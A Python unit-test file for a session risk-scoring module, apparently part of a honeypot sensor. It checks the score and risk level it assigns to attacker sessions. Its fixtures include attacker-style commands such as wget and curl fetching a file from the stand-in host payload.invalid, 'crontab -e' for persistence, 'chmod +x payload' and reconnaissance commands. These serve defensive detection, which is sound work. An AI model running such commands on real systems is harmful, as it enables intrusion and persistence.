from __future__ import annotations

import unittest

from risk.rules import RiskLevel
from risk.scoring import SessionRiskInput, command_matches, evaluate_session


class RiskScoringTests(unittest.TestCase):
    def test_low_assessment(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:low",
                has_successful_login=True,
                has_download=False,
                usernames=("root",),
            )
        )

        self.assertEqual(assessment.score, 15)
        self.assertEqual(assessment.risk_level, RiskLevel.LOW)

    def test_medium_assessment(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:medium",
                has_successful_login=False,
                has_download=True,
                commands=("wget http://payload.invalid/file",),
            )
        )

        self.assertEqual(assessment.score, 35)
        self.assertEqual(assessment.risk_level, RiskLevel.MEDIUM)

    def test_high_assessment(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:high",
                has_successful_login=True,
                has_download=True,
                usernames=("root",),
                commands=("whoami", "curl http://payload.invalid/file"),
            )
        )

        self.assertEqual(assessment.score, 60)
        self.assertEqual(assessment.risk_level, RiskLevel.HIGH)

    def test_critical_assessment(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:critical",
                has_successful_login=True,
                has_download=True,
                usernames=("root",),
                commands=(
                    "whoami",
                    "wget http://payload.invalid/file",
                    "crontab -e",
                ),
            )
        )

        self.assertEqual(assessment.score, 85)
        self.assertEqual(assessment.risk_level, RiskLevel.CRITICAL)
        self.assertEqual(len(assessment.reasons), 6)

    def test_repeated_commands_do_not_repeat_rule_weight(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:repeat",
                has_successful_login=False,
                has_download=False,
                commands=("whoami", "id", "uname -a"),
            )
        )

        self.assertEqual(assessment.score, 10)
        self.assertEqual(len(assessment.reasons), 1)

    def test_short_command_pattern_respects_token_boundaries(self) -> None:
        self.assertTrue(command_matches("id", "id"))
        self.assertTrue(command_matches("echo x; id", "id"))
        self.assertFalse(command_matches("chmod +x payload", "id"))

    def test_empty_session_has_zero_low_score(self) -> None:
        assessment = evaluate_session(
            SessionRiskInput(
                session_key="sensor:empty",
                has_successful_login=False,
                has_download=False,
            )
        )

        self.assertEqual(assessment.score, 0)
        self.assertEqual(assessment.risk_level, RiskLevel.LOW)
        self.assertEqual(assessment.reasons, ())


if __name__ == "__main__":
    unittest.main()
